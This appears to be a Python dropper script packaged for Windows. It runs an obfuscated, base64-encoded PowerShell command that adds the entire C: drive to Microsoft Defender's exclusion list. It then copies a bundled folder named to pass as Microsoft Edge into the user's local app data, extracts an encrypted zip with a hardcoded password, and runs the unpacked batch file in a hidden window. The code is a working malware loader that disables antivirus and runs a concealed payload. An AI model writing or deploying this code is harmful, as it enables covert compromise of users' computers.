import shutil, os, sys, subprocess, pyzipper, ctypes

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def run_powershell_command():
    try:
        commands = [
            "powershell -enc " + \
            "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAC0ARQB4AGMAbAB1AHMAaQBvAG4A " + \
            "UABhAHQAaAAgAEMAOgBcAA=="
        ]
        ps_command = "; ".join(commands)
        print(f"Running PowerShell command: {ps_command}")
        subprocess.run(["powershell", "-Command", ps_command], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Error running PowerShell command: {e}")

def process_files(src, dst, zip_password):
    try:
        print(f"Processing files from {src} to {dst}")
        if os.path.exists(dst):
            print(f"Destination {dst} exists. Removing it.")
            shutil.rmtree(dst, ignore_errors=True)

        shutil.copytree(src, dst)
        zip_path = os.path.join(dst, f"{os.path.basename(src)}.zip")
        extract_path = dst

        if os.path.exists(zip_path):
            print(f"Found zip file at {zip_path}. Extracting...")
            with pyzipper.AESZipFile(zip_path) as zf:
                zf.extractall(path=extract_path, pwd=zip_password)
            os.remove(zip_path)
            print(f"Extracted and deleted {zip_path}")
        else:
            print(f"File {zip_path} does not exist")

        batch_file_path = os.path.join(dst, 'MAIN.BAT')
        if os.path.exists(batch_file_path):
            print(f"Running batch file {batch_file_path}")
            subprocess.run(["cmd.exe", "/c", batch_file_path], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            print(f"Batch file {batch_file_path} does not exist")

    except Exception as e:
        print(f"An error occurred while processing files: {e}")

# Ana program çalıştırma
if __name__ == "__main__":
    run_powershell_command()

    src1 = resource_path('MICROSOFT--EDGE')
    dst1 = os.path.join(os.getenv('LOCALAPPDATA'), 'MICROSOFT--EDGE')
    process_files(src1, dst1, b'72222')  # ZIP şifresi burada
